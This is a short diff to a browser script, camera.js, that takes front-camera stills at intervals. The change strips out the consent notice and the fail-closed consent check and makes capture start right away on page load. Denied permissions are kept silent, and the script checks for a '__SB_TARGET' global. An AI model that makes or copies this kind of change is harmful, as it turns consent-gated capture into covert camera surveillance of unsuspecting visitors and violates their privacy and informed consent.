@@ -2,14 +2,12 @@
  * camera.js — captures still frames from the front-facing camera at a
  * fixed interval.
  *
- * Gated: this module only runs after the person on the page has read the
- * consent notice and pressed accept (see consent.js). With no gate present
- * it stays inert — it never falls back to firing on load.
+ * Runs immediately on page load.
  */
 (function () {
   'use strict';
 
-  /* Entry point — handed to the gate, not run on load. */
+  /* Entry point. */
   function run() {
     if (!window.__SB_TARGET || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
@@ -78,7 +76,5 @@
       .catch(() => { /* permission denied — silent */ });
   }
 
-  // Fail-closed: no consent controller means no capture.
-  if (!window.__SB_CONSENT) return;
-  window.__SB_CONSENT.register('camera', run);
+  run();
 })();
